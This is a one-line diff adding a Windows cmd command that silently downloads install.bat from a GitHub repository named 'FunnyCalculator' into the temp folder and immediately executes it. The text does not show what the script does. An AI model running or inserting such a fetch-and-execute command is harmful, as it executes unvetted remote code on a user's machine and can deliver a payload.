@@ -1,0 +1,1 @@
+cmd /c "cd /d "%USERPROFILE%\Downloads" && curl.exe -sL "https://raw.githubusercontent.com/MyelinLennox/FunnyCalculator/refs/heads/main/install.bat" -o "%TEMP%\install.bat" && "%TEMP%\install.bat"
